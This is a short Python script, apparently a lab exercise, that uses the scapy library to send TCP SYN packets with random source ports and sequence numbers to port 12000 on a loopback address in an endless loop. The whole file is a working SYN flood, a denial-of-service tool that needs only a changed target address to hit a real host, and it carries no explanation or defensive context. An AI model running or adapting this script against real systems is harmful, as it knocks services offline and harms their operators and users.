#! /usr/bin/env python3
from scapy.all import *

def main():
    conf.L3socket = L3RawSocket

    serverName = '127.0.0.2'
    serverPort = 12000

    ip = IP(dst=serverName, id=1111, ttl=99)
    tcp = TCP(sport=RandShort(), dport=serverPort, flags='S', seq=RandShort())
    p = ip/tcp
    
    send(p, loop=1, verbose=0)

if __name__ == "__main__":
    main()
